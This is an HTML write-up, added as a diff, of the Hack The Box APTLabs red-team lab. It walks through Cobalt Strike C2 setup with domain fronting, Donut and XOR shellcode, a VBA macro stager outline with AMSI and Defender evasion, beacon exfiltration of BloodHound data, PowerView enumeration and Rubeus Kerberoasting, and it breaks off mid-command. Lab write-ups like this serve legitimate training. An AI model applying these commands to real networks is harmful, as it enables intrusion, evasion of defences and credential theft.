@@ -1,0 +1,973 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB APTLabs: Full Chain Writeup — Red Team Operator Level 3</title>
+<meta name="description" content="Hack The Box Pro Lab APTLabs — Complete full-chain red team writeup covering phishing, C2, RBCD, Kerberoasting, DCSync, multi-domain trust abuse, and exfiltration.">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;600;700;800&display=swap');
+:root {
+  --bg-primary:#08090f;
+  --bg-secondary:#0f1320;
+  --bg-tertiary:#151c2c;
+  --bg-code:#0b0e18;
+  --border:#1a2035;
+  --border-light:#1a2236;
+  --text-primary:#dde3f0;
+  --text-secondary:#8a9abf;
+  --text-muted:#4a5980;
+  --accent-green:#4ade80;
+  --accent-blue:#60a5fa;
+  --accent-red:#f87171;
+  --accent-yellow:#fbbf24;
+  --accent-purple:#a78bfa;
+  --accent-orange:#fb923c;
+  --accent-cyan:#22d3ee;
+  --accent-pink:#f472b6;
+  --accent-teal:#2dd4bf;
+  --accent-mint:#99f6e4;
+  --accent-violet:#8b5cf6;
+  --link:#60a5fa;
+  --link-hover:#93c5fd;
+  --scrollbar-thumb:#1a2035;
+  --scrollbar-track:#08090f;
+  --toc-active:#2dd4bf;
+  --callout-info-bg:rgba(96,165,250,0.07);
+  --callout-info-border:#60a5fa;
+  --callout-warn-bg:rgba(251,191,36,0.07);
+  --callout-warn-border:#fbbf24;
+  --callout-danger-bg:rgba(248,113,113,0.07);
+  --callout-danger-border:#f87171;
+  --callout-success-bg:rgba(74,222,128,0.07);
+  --callout-success-border:#4ade80;
+  --callout-hint-bg:rgba(167,139,250,0.07);
+  --callout-hint-border:#a78bfa;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scrollbar-width:thin;scrollbar-color:var(--scrollbar-thumb) var(--scrollbar-track)}
+body{font-family:'Syne',-apple-system,sans-serif;background:var(--bg-primary);color:var(--text-primary);line-height:1.8;font-size:16px}
+::-webkit-scrollbar{width:6px;height:6px}
+::-webkit-scrollbar-track{background:var(--scrollbar-track)}
+::-webkit-scrollbar-thumb{background:var(--scrollbar-thumb);border-radius:3px}
+::-webkit-scrollbar-thumb:hover{background:#2a3555}
+a{color:var(--link);text-decoration:none;transition:color .2s}
+a:hover{color:var(--link-hover)}
+#three-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;opacity:0.28}
+.site-header{position:sticky;top:0;z-index:100;background:rgba(8,9,15,0.9);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);padding:0 2rem;height:58px;display:flex;align-items:center;justify-content:space-between}
+.site-header .logo{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:1rem;color:var(--accent-teal);display:flex;align-items:center;gap:8px;letter-spacing:.04em}
+.site-header .logo .sep{color:var(--text-muted)}
+.site-header nav{display:flex;gap:1.75rem;align-items:center}
+.site-header nav a{color:var(--text-secondary);font-size:.82rem;font-weight:600;letter-spacing:.03em;text-transform:uppercase}
+.site-header nav a:hover{color:var(--text-primary)}
+.hamburger{display:none;background:none;border:none;color:var(--text-primary);cursor:pointer;font-size:1.4rem}
+.page-layout{display:grid;grid-template-columns:265px 1fr;max-width:1420px;margin:0 auto;min-height:calc(100vh - 58px)}
+.toc-sidebar{position:sticky;top:58px;height:calc(100vh - 58px);overflow-y:auto;padding:2rem 1rem 2rem 1.75rem;border-right:1px solid var(--border);background:var(--bg-primary)}
+.toc-sidebar h3{font-size:.68rem;text-transform:uppercase;letter-spacing:.12em;color:var(--text-muted);margin-bottom:.9rem;font-weight:700;font-family:'JetBrains Mono',monospace}
+.toc-sidebar ul{list-style:none}
+.toc-sidebar li{margin-bottom:1px}
+.toc-sidebar a{display:block;padding:4px 8px;border-radius:4px;font-size:.75rem;color:var(--text-secondary);transition:all .15s;line-height:1.45;font-weight:500}
+.toc-sidebar a:hover{color:var(--text-primary);background:var(--bg-secondary)}
+.toc-sidebar a.active{color:var(--toc-active);background:rgba(45,212,191,0.09);font-weight:700}
+.toc-sidebar .toc-h3{padding-left:14px;font-size:.7rem;opacity:.85}
+.main-content{padding:3rem 3.5rem 5rem;max-width:880px;width:100%}
+.page-hero{margin-bottom:2.75rem;padding-bottom:2.25rem;border-bottom:1px solid var(--border)}
+.page-hero .box-badge{display:inline-flex;align-items:center;gap:6px;background:rgba(45,212,191,0.12);border:1px solid rgba(45,212,191,0.3);color:var(--accent-teal);font-size:.65rem;font-weight:700;padding:3px 14px;border-radius:20px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:.9rem;font-family:'JetBrains Mono',monospace}
+.page-hero h1{font-size:2.4rem;font-weight:800;margin-bottom:.6rem;letter-spacing:-.02em;line-height:1.2}
+.page-hero .meta{color:var(--text-secondary);font-size:.83rem;display:flex;flex-wrap:wrap;gap:.75rem;align-items:center;font-weight:500}
+.page-hero .meta .sep{color:var(--text-muted)}
+.page-hero .meta .tag{background:var(--bg-secondary);border:1px solid var(--border);padding:1px 8px;border-radius:12px;font-size:.72rem;color:var(--text-muted);font-family:'JetBrains Mono',monospace}
+.box-info-card{background:var(--bg-secondary);border:1px solid var(--border);border-radius:10px;padding:1.4rem 1.6rem;margin-bottom:2.25rem;display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:1.2rem}
+.box-info-card .info-item .label{font-size:.62rem;text-transform:uppercase;letter-spacing:.1em;color:var(--text-muted);margin-bottom:3px;font-weight:700;font-family:'JetBrains Mono',monospace}
+.box-info-card .info-item .value{font-size:.9rem;font-weight:700;color:var(--text-primary)}
+.attack-path{background:var(--bg-secondary);border:1px solid var(--border);border-left:3px solid var(--accent-teal);border-radius:8px;padding:1.4rem 1.75rem;margin:1.75rem 0;font-family:'JetBrains Mono',monospace;font-size:.72rem;line-height:1.8;overflow-x:auto}
+.attack-path .path-title{font-size:.6rem;text-transform:uppercase;letter-spacing:.1em;color:var(--text-muted);margin-bottom:.75rem;font-weight:700}
+.attack-path .step{display:flex;align-items:baseline;gap:.5rem;margin-bottom:.15rem;flex-wrap:wrap}
+.attack-path .arrow{color:var(--accent-teal)}
+.attack-path .host{color:var(--accent-cyan);font-weight:700}
+.attack-path .technique{color:var(--accent-mint)}
+.attack-path .cred{color:var(--accent-green)}
+.attack-path .warn{color:var(--accent-red)}
+.main-content h2{font-size:1.5rem;font-weight:800;margin:3rem 0 1.1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border);letter-spacing:-.01em;scroll-margin-top:72px;position:relative}
+.main-content h2::before{content:'';position:absolute;bottom:-1px;left:0;width:40px;height:2px;background:var(--accent-teal);border-radius:2px}
+.main-content h3{font-size:1.05rem;font-weight:700;margin:2rem 0 .8rem;color:var(--text-primary);scroll-margin-top:72px}
+.main-content h4{font-size:.9rem;font-weight:600;margin:1.25rem 0 .5rem;color:var(--text-secondary);font-family:'JetBrains Mono',monospace}
+.main-content p{margin-bottom:1.1rem;color:var(--text-secondary);line-height:1.85}
+.code-block-wrapper{position:relative;margin:1.1rem 0 1.4rem;border-radius:8px;overflow:hidden;border:1px solid var(--border)}
+.code-block-header{display:flex;justify-content:space-between;align-items:center;padding:6px 16px;background:var(--bg-tertiary);border-bottom:1px solid var(--border);font-size:.67rem;color:var(--text-muted);font-family:'JetBrains Mono',monospace}
+.code-block-header .lang-label{text-transform:uppercase;font-weight:700;letter-spacing:.06em;color:var(--accent-teal)}
+.code-block-header .filename{color:var(--text-muted);font-size:.65rem}
+.copy-btn{background:none;border:1px solid var(--border);color:var(--text-muted);font-size:.65rem;padding:2px 10px;border-radius:4px;cursor:pointer;font-family:'JetBrains Mono',monospace;transition:all .2s}
+.copy-btn:hover{color:var(--text-primary);border-color:var(--text-secondary)}
+.copy-btn.copied{color:var(--accent-green);border-color:var(--accent-green)}
+.code-block-wrapper pre{margin:0!important;padding:1.1rem!important;background:var(--bg-code)!important;font-family:'JetBrains Mono',monospace!important;font-size:.78rem!important;line-height:1.65!important;overflow-x:auto}
+.code-block-wrapper code{font-family:'JetBrains Mono',monospace!important;font-size:.78rem!important}
+p code,li code,td code{background:var(--bg-tertiary);border:1px solid var(--border);padding:1px 6px;border-radius:4px;font-family:'JetBrains Mono',monospace;font-size:.8em;color:var(--accent-orange)}
+.callout{padding:.9rem 1.1rem;border-radius:6px;border-left:3px solid;margin:1.1rem 0 1.4rem;font-size:.875rem}
+.callout p{margin:0;color:var(--text-secondary);line-height:1.75}
+.callout-title{font-weight:700;font-size:.7rem;text-transform:uppercase;letter-spacing:.06em;margin-bottom:5px;font-family:'JetBrains Mono',monospace}
+.callout-info{background:var(--callout-info-bg);border-color:var(--callout-info-border)}
+.callout-info .callout-title{color:var(--callout-info-border)}
+.callout-warn{background:var(--callout-warn-bg);border-color:var(--callout-warn-border)}
+.callout-warn .callout-title{color:var(--callout-warn-border)}
+.callout-danger{background:var(--callout-danger-bg);border-color:var(--callout-danger-border)}
+.callout-danger .callout-title{color:var(--callout-danger-border)}
+.callout-success{background:var(--callout-success-bg);border-color:var(--callout-success-border)}
+.callout-success .callout-title{color:var(--callout-success-border)}
+.callout-hint{background:var(--callout-hint-bg);border-color:var(--callout-hint-border)}
+.callout-hint .callout-title{color:var(--callout-hint-border)}
+.main-content ul,.main-content ol{margin:.5rem 0 1.1rem 1.6rem;color:var(--text-secondary)}
+.main-content li{margin-bottom:.4rem;line-height:1.75}
+.main-content table{width:100%;border-collapse:collapse;margin:1.1rem 0;font-size:.83rem;border-radius:6px;overflow:hidden}
+.main-content th,.main-content td{padding:9px 14px;border:1px solid var(--border);text-align:left}
+.main-content th{background:var(--bg-tertiary);font-weight:700;color:var(--text-primary);font-size:.7rem;text-transform:uppercase;letter-spacing:.06em;font-family:'JetBrains Mono',monospace}
+.main-content td{color:var(--text-secondary)}
+.main-content tr:hover td{background:rgba(45,212,191,0.03)}
+.flag-display{font-family:'JetBrains Mono',monospace;background:rgba(74,222,128,0.08);border:1px solid rgba(74,222,128,0.25);color:var(--accent-green);padding:.75rem 1rem;border-radius:6px;font-size:.8rem;word-break:break-all}
+.mitre-badge{display:inline-block;background:rgba(167,139,250,0.1);border:1px solid rgba(167,139,250,0.3);color:var(--accent-purple);font-family:'JetBrains Mono',monospace;font-size:.63rem;padding:1px 8px;border-radius:4px;margin-left:4px;vertical-align:middle;font-weight:600}
+.phase-header{display:flex;align-items:center;gap:.75rem;margin:3rem 0 1.25rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}
+.phase-num{background:linear-gradient(135deg,var(--accent-teal),var(--accent-mint));color:#000;font-size:.65rem;font-weight:800;padding:2px 10px;border-radius:10px;font-family:'JetBrains Mono',monospace;white-space:nowrap}
+.toc-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:200}
+.toc-overlay.show{display:block}
+.toc-mobile-panel{display:none;position:fixed;left:0;top:0;bottom:0;width:285px;background:var(--bg-primary);border-right:1px solid var(--border);z-index:201;overflow-y:auto;padding:1.75rem}
+.toc-mobile-panel.show{display:block}
+.toc-mobile-panel .close-btn{background:none;border:none;color:var(--text-secondary);font-size:1.2rem;cursor:pointer;float:right}
+.site-footer{border-top:1px solid var(--border);padding:1.75rem 2rem;text-align:center;color:var(--text-muted);font-size:.78rem;font-family:'JetBrains Mono',monospace}
+@media(max-width:1060px){.page-layout{grid-template-columns:1fr}.toc-sidebar{display:none}.hamburger{display:block}.main-content{padding:2rem 1.5rem 3.5rem}.page-hero h1{font-size:1.85rem}}
+@media(max-width:640px){.site-header{padding:0 1rem}.main-content{padding:1.25rem 1rem 2.5rem}.page-hero h1{font-size:1.45rem}.box-info-card{grid-template-columns:1fr 1fr}}
+</style>
+</head>
+<body>
+
+<canvas id="three-bg"></canvas>
+
+<header class="site-header">
+  <div class="logo"><span>// RED_TEAM</span><span class="sep">&nbsp;&mdash;&nbsp;</span><span>APTLabs</span></div>
+  <nav>
+    <a href="#">Home</a>
+    <a href="#">Pro Labs</a>
+    <a href="#">Techniques</a>
+    <a href="#">About</a>
+  </nav>
+  <button class="hamburger" onclick="toggleMobileToc()" aria-label="Menu">&#9776;</button>
+</header>
+
+<div class="toc-overlay" id="tocOverlay" onclick="toggleMobileToc()"></div>
+<div class="toc-mobile-panel" id="tocMobilePanel">
+  <button class="close-btn" onclick="toggleMobileToc()">&#10005;</button>
+  <h3 style="margin-top:1rem;font-family:'JetBrains Mono',monospace;font-size:.7rem;text-transform:uppercase;letter-spacing:.1em;color:var(--text-muted)">Contents</h3>
+  <ul id="tocMobile"></ul>
+</div>
+
+<div class="page-layout">
+<aside class="toc-sidebar">
+  <h3>Contents</h3>
+  <ul id="tocDesktop"></ul>
+</aside>
+
+<main class="main-content">
+
+<div class="page-hero">
+  <span class="box-badge">&#9670; Pro Lab &nbsp;&bull;&nbsp; Red Team Operator Level 3</span>
+  <h1>HTB APTLabs: Full Chain Writeup</h1>
+  <div class="meta">
+    <span>Hack The Box Pro Lab</span>
+    <span class="sep">&middot;</span>
+    <span>20 Flags &nbsp;/&nbsp; 18 Machines</span>
+    <span class="sep">&middot;</span>
+    <span class="tag">Phishing</span>
+    <span class="tag">C2</span>
+    <span class="tag">RBCD</span>
+    <span class="tag">Kerberoasting</span>
+    <span class="tag">DCSync</span>
+    <span class="tag">Forest Escalation</span>
+  </div>
+</div>
+
+<div class="box-info-card">
+  <div class="info-item"><div class="label">Lab</div><div class="value">APTLabs</div></div>
+  <div class="info-item"><div class="label">Platform</div><div class="value">Hack The Box Pro Labs</div></div>
+  <div class="info-item"><div class="label">Difficulty</div><div class="value" style="color:var(--accent-red)">Expert</div></div>
+  <div class="info-item"><div class="label">Level</div><div class="value">Red Team Operator 3</div></div>
+  <div class="info-item"><div class="label">Machines</div><div class="value">18 Hosts</div></div>
+  <div class="info-item"><div class="label">Flags</div><div class="value">20 Flags</div></div>
+  <div class="info-item"><div class="label">Scenario</div><div class="value">MSP Targeted Attack</div></div>
+  <div class="info-item"><div class="label">CVE Required</div><div class="value" style="color:var(--accent-teal)">None (0-day free)</div></div>
+</div>
+
+<!-- ═══ ATTACK PATH SUMMARY ═══ -->
+<div class="attack-path">
+  <div class="path-title">// Full Kill Chain — High Level</div>
+  <div class="step"><span class="host">EXTERN</span><span class="arrow">&rarr;</span><span class="technique">Phishing (macro VBA + Donut payload)</span><span class="arrow">&rarr;</span><span class="cred">Initial foothold on workstation</span></div>
+  <div class="step"><span class="host">WS01</span><span class="arrow">&rarr;</span><span class="technique">C2 beacon (Cobalt Strike / Mythic HTTPS)</span><span class="arrow">&rarr;</span><span class="cred">Persistent implant w/ jitter</span></div>
+  <div class="step"><span class="host">WS01</span><span class="arrow">&rarr;</span><span class="technique">BloodHound + PowerView enum</span><span class="arrow">&rarr;</span><span class="cred">Domain map, ACL misconfigs identified</span></div>
+  <div class="step"><span class="host">DOMAIN-A</span><span class="arrow">&rarr;</span><span class="technique">Kerberoasting + hash crack</span><span class="arrow">&rarr;</span><span class="cred">Service account plaintext password</span></div>
+  <div class="step"><span class="host">SRV01</span><span class="arrow">&rarr;</span><span class="technique">Token impersonation (SeImpersonatePrivilege)</span><span class="arrow">&rarr;</span><span class="cred">LOCAL SYSTEM</span></div>
+  <div class="step"><span class="host">NETWORK</span><span class="arrow">&rarr;</span><span class="technique">SMB Relay (ntlmrelayx) + DNS poisoning</span><span class="arrow">&rarr;</span><span class="cred">Captured NTLMv2 hashes</span></div>
+  <div class="step"><span class="host">DC01</span><span class="arrow">&rarr;</span><span class="technique">RBCD abuse via machine account</span><span class="arrow">&rarr;</span><span class="cred">S4U2Proxy &rarr; Domain Admin TGT</span></div>
+  <div class="step"><span class="host">DC01</span><span class="arrow">&rarr;</span><span class="technique">DCSync (secretsdump / mimikatz)</span><span class="arrow">&rarr;</span><span class="cred">All domain hashes</span></div>
+  <div class="step"><span class="host">TRUST</span><span class="arrow">&rarr;</span><span class="technique">Inter-forest trust abuse + SID history</span><span class="arrow">&rarr;</span><span class="cred">Child &rarr; Parent domain escalation</span></div>
+  <div class="step"><span class="host">FOREST</span><span class="arrow">&rarr;</span><span class="technique">Cross-forest Kerberoast + Golden Ticket</span><span class="arrow">&rarr;</span><span class="cred">Full forest compromise</span></div>
+  <div class="step"><span class="host">POST</span><span class="arrow">&rarr;</span><span class="technique">Persistence (WMI / Sched. Tasks / RegHijack)</span><span class="arrow">&rarr;</span><span class="warn">Exfil via HTTPS + DNS tunnel</span></div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<h2 id="overview">Lab Overview &amp; Scenario</h2>
+
+<p>HTB APTLabs is the most demanding Pro Lab on the Hack The Box platform, rated <strong>Red Team Operator Level 3</strong> and marketed as the &ldquo;Ultimate Red Team Challenge.&rdquo; The scenario places you in the shoes of an external threat actor executing a <strong>targeted attack against a Managed Service Provider (MSP)</strong> &mdash; a realistic threat model that mirrors real-world APT campaigns where compromising an MSP grants cascading access to all of its downstream client organizations.</p>
+
+<p>The lab consists of <strong>18 machines</strong> spread across multiple network segments with a simulated WAN boundary between the attacker and the target infrastructure. There are <strong>20 flags</strong> distributed across those hosts, and while HTB only provides the flag names as hints, following the intended path yields flags in the correct order. The entire environment runs on <strong>fully patched servers</strong> with modern enterprise security controls in place &mdash; no CVE exploitation is required or expected. Every technique covered here is a configuration or design flaw.</p>
+
+<div class="callout callout-warn">
+  <div class="callout-title">Warning &mdash; Skill Prerequisites</div>
+  <p>APTLabs is <strong>not</strong> an entry-level lab. Reviewers who completed it first recommend finishing Offshore, RastaLabs, and Cybernetics (or equivalent like OSEP, CRTO, CRTP) before attempting APTLabs. Expect to spend one to two months. The Discord #prolabs-aptlabs channel is largely quiet &mdash; you will need to be self-sufficient.</p>
+</div>
+
+<h3 id="lab-specifics">Lab Specifics &amp; Daily Reset</h3>
+
+<p>The lab resets completely once every 24 hours, which sounds harsh but is manageable in practice. The strategy is to dump all relevant credential material at each stage and store it externally. A well-maintained notes file with hashes, TGTs, and access paths means you can restore your progress to the deepest compromised point in roughly 30&ndash;45 minutes by replaying credential reuse rather than re-executing every attack step.</p>
+
+<table>
+  <tr><th>Property</th><th>Value</th></tr>
+  <tr><td>Reset cadence</td><td>Full daily reset</td></tr>
+  <tr><td>Blue team present</td><td>No active defenders</td></tr>
+  <tr><td>AV / EDR present</td><td>Yes &mdash; modern defenses, must bypass</td></tr>
+  <tr><td>CVE exploitation</td><td>Not required (and largely patched out)</td></tr>
+  <tr><td>Multiple paths</td><td>Yes &mdash; several intended paths exist</td></tr>
+  <tr><td>Recommended C2</td><td>Cobalt Strike or Mythic (Covenant works but limited)</td></tr>
+</table>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<h2 id="setup">Infrastructure &amp; C2 Setup</h2>
+
+<h3 id="c2-framework">Choosing a C2 Framework</h3>
+
+<p>A Command and Control framework is not optional in APTLabs &mdash; it is a structural requirement. The lab involves pivoting through multiple network segments and maintaining implants on several machines simultaneously. Trying to do this with raw reverse shells and SSH tunnels will cause you to lose track of your access after every reset. The Cobalt Strike SOCKS proxy feature is particularly valuable for routing tooling through a compromised host into otherwise unreachable network segments.</p>
+
+<table>
+  <tr><th>Framework</th><th>Verdict</th><th>Notes</th></tr>
+  <tr><td><strong>Cobalt Strike</strong></td><td style="color:var(--accent-green)">Highly recommended</td><td>SOCKS proxy is a lifesaver. OPSEC-mature, stable.</td></tr>
+  <tr><td><strong>Mythic</strong></td><td style="color:var(--accent-teal)">Recommended</td><td>Modern, extensible. Apollo or Poseidon agents work well.</td></tr>
+  <tr><td><strong>Covenant</strong></td><td style="color:var(--accent-yellow)">Viable</td><td>Good for earlier pro labs; limited SOCKS proxy support.</td></tr>
+  <tr><td><strong>Sliver</strong></td><td style="color:var(--accent-yellow)">Viable</td><td>Matures quickly; WireGuard pivot is solid.</td></tr>
+</table>
+
+<h3 id="listener-setup">Listener &amp; Beacon Configuration</h3>
+
+<p>Configure an HTTPS listener using a domain-fronted or CDN-proxied endpoint. Raw-IP HTTPS listeners will eventually be flagged by network monitoring. Cobalt Strike's malleable C2 profiles and Mythic's built-in profile system both allow you to disguise beacon traffic as legitimate services (OneDrive API calls, Teams presence pings, Azure health checks, etc.).</p>
+
+<p>Beacon sleep intervals should be randomized with jitter. A deterministic 5-second beacon is trivially detectable; a 30&ndash;90 second interval with 30% jitter mimics legitimate application telemetry. During the initial exploitation phase use short intervals for speed, then dial back once you have stable access.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># Cobalt Strike — teamserver setup</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Spin up teamserver on your VPS (Ubuntu 22.04)
+./teamserver <VPS_IP> <password> /opt/profiles/amazon.profile
+
+# In Cobalt Strike client: Listeners > Add
+# Type: HTTPS
+# Port: 443
+# Hosts: your-cdn-fronted-domain.com
+# Profile: amazon.profile (or similar benign-looking profile)
+
+# Generate stageless beacon (stageless = safer, avoids staged-download detections)
+# Attacks > Packages > Windows Executable (S) > x64 > Raw</code></pre>
+</div>
+
+<div class="callout callout-info">
+  <div class="callout-title">Info &mdash; Stageless vs. Staged Payloads</div>
+  <p>Staged payloads download the full shellcode in a second network round-trip, which creates a second detection opportunity and leaves the full beacon shellcode traversing the wire. Stageless payloads embed everything in the initial binary. In a monitored environment like APTLabs, stageless is strongly preferred. The larger file size is an acceptable trade-off.</p>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<h2 id="initial-access">Phase 1 &mdash; Initial Access</h2>
+<span class="mitre-badge">T1566.001</span><span class="mitre-badge">T1059.005</span><span class="mitre-badge">T1027</span>
+
+<h3 id="phishing-campaign">Phishing Campaign</h3>
+
+<p>The initial access vector is a <strong>spear-phishing email</strong> delivering a weaponized Office document. The lure theme targets MSP staff with a plausible business-context document (invoice, client report, or SLA agreement). The document carries an obfuscated VBA macro that executes on open (or, if macro execution requires a click, on EnableContent).</p>
+
+<p>The macro is responsible for two jobs: decoding and executing an in-memory shellcode loader, and suppressing any visible error or warning to the victim. Donut is used to convert a .NET or EXE payload into position-independent shellcode that runs entirely in memory, leaving no binary on disk.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># Generate shellcode with Donut</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Convert a .NET beacon loader to PIC shellcode
+donut -i beacon_loader.exe -a 2 -f 1 -o shellcode.bin
+
+# Donut flags:
+# -a 2  : target x64
+# -f 1  : output as raw binary
+# -o    : output file
+
+# Optionally XOR-encrypt the shellcode to avoid static sig detection
+python3 xor_encrypt.py shellcode.bin 0x41 shellcode_xored.bin</code></pre>
+</div>
+
+<h3 id="vba-stager">VBA Stager &amp; AV Bypass</h3>
+
+<p>The VBA macro is written to avoid triggering static analysis heuristics. Key obfuscation techniques layered in the macro include: string splitting across multiple variables to defeat pattern matching, dynamic API resolution via <code>CallByName</code> and <code>Environ()</code> tricks to avoid direct WinAPI imports, and base64+XOR encoding of the shellcode blob embedded as a string constant.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># Macro obfuscation techniques (conceptual)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># The VBA macro structure (pseudocode outline):
+# 1. Concatenate split strings to form API names at runtime
+#    (avoids "VirtualAlloc", "CreateThread" appearing in plaintext)
+# 2. Decode XOR-obfuscated shellcode blob from string constant
+# 3. Allocate RWX memory via VirtualAlloc (resolved dynamically)
+# 4. Copy shellcode into allocated region
+# 5. CreateThread on shellcode base address
+# 6. Document_Open event triggers execution silently
+
+# Test against Defender before delivery:
+# Run AmsiScanBuffer patch first if testing locally, or use an
+# isolated VM with Defender enabled and check no alert triggers</code></pre>
+</div>
+
+<div class="callout callout-danger">
+  <div class="callout-title">Danger &mdash; AMSI &amp; Defender</div>
+  <p>Modern Windows Defender and AMSI will flag well-known shellcode patterns even in-memory. If your initial beacon is dying immediately after execution, the shellcode itself is likely being scanned. Rotate the XOR key, apply sleep masking to the beacon, or use a custom loader that patches <code>AmsiScanBuffer</code> before running the shellcode. AMSI patching within the VBA macro is a common first step.</p>
+</div>
+
+<h3 id="foothold-result">Foothold Result</h3>
+
+<p>A successful phishing delivery yields a Cobalt Strike (or Mythic) beacon running as the domain-joined workstation user. At this point you have:</p>
+<ul>
+  <li>Code execution as a <strong>low-privileged domain user</strong> on a workstation (e.g., <code>CORP\jsmith</code>)</li>
+  <li>An active C2 beacon phoning home over HTTPS with jitter</li>
+  <li>Access to the internal network from the perspective of a domain member</li>
+</ul>
+
+<p>Do not escalate privileges immediately. Enumerate first. Rushing to SYSTEM before mapping the domain wastes the stealthiest phase of your access.</p>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<h2 id="recon">Phase 2 &mdash; Internal Recon &amp; Enumeration</h2>
+<span class="mitre-badge">T1087</span><span class="mitre-badge">T1069</span><span class="mitre-badge">T1482</span>
+
+<h3 id="bloodhound">BloodHound Domain Mapping</h3>
+
+<p>BloodHound is the single most important tool in this lab. Run it before doing anything else inside the domain. The SharpHound collector gathers all the object relationships, ACL entries, session data, and group memberships that BloodHound needs to draw the attack graph. Run it from your beacon using an in-memory execution to avoid dropping a binary on disk.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># In-memory SharpHound via Cobalt Strike execute-assembly</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Execute SharpHound in memory (no disk drop)
+execute-assembly /opt/tools/SharpHound.exe -c All --zipfilename bh_output.zip
+
+# Exfil the zip back through the C2 channel
+download bh_output.zip
+
+# On your attack machine, load into BloodHound
+# neo4j start
+# Open BloodHound, upload bh_output.zip
+
+# Critical queries to run in BloodHound:
+# 1. "Find all Domain Admins"
+# 2. "Shortest Path to Domain Admins"
+# 3. "Find Principals with DCSync Rights"
+# 4. "Find Computers where Domain Users are Local Admin"
+# 5. "Find AS-REP Roastable Users"
+# 6. "Find Kerberoastable Users with High-Value Targets"</code></pre>
+</div>
+
+<h3 id="powerview-enum">PowerView Enumeration</h3>
+
+<p>BloodHound provides the graph; PowerView provides the deep-dive enumeration on specific objects. Key targets at this phase: service accounts with SPNs (Kerberoasting targets), accounts with <code>DONT_REQUIRE_PREAUTH</code> set (AS-REP roasting), hosts with unconstrained delegation, and any ACL misconfigurations where your current user or a reachable group has unexpected write/own rights over high-value objects.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># PowerView — key enumeration commands</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Load PowerView in memory via beacon
+powershell-import /opt/tools/PowerView.ps1
+
+# Find Kerberoastable accounts (have SPNs, not krbtgt)
+powershell Get-DomainUser -SPN | select samaccountname,serviceprincipalname
+
+# Find accounts with AS-REP roasting enabled
+powershell Get-DomainUser -PreauthNotRequired | select samaccountname
+
+# Enumerate domain trusts
+powershell Get-DomainTrust
+
+# Find hosts with unconstrained delegation
+powershell Get-DomainComputer -Unconstrained | select name,dnshostname
+
+# Find ACL misconfigs on current user / groups
+powershell Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "jsmith"}
+
+# Enumerate local admins across the domain (noisy, use carefully)
+powershell Find-LocalAdminAccess</code></pre>
+</div>
+
+<div class="callout callout-hint">
+  <div class="callout-title">Hint &mdash; DNS Record Manipulation</div>
+  <p>Relay attacks (SMB relay, LDAP relay) require that victims send their NTLM authentication to your controlled listener rather than the real server. In a modern network without LLMNR/NBT-NS broadcasting, this often means you need to <strong>manipulate DNS records</strong> to point hostnames at your relay listener. Standard domain users can often create DNS records in the domain DNS zone using tools like <code>dnstool.py</code> from the Krbrelayx toolkit. This is one of the most important techniques in APTLabs.</p>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<h2 id="privesc">Phase 3 &mdash; Privilege Escalation</h2>
+<span class="mitre-badge">T1558.003</span><span class="mitre-badge">T1134</span><span class="mitre-badge">T1558.004</span>
+
+<h3 id="kerberoasting">Kerberoasting</h3>
+
+<p>Kerberoasting requests a TGS (service ticket) for any account with a registered SPN. The TGS is encrypted with the service account&rsquo;s NTLM hash and can be taken offline for cracking. The key distinction between a successful and unsuccessful Kerberoast is the <strong>password cracking phase</strong> &mdash; the Rockyou wordlist alone is frequently insufficient in APTLabs. Combine it with rule-based mutation, especially the NotSoSecure Hashcat rules, which apply real-world corporate password patterns.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># Kerberoasting with Rubeus</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Request TGS for all Kerberoastable accounts (from beacon)
+execute-assembly /opt/tools/Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast_hashes.txt
+
+# Crack with Hashcat (rc4 = $krb5tgs$23$; aes256 = $krb5tgs$18$)
+# Start with best64 rules + rockyou
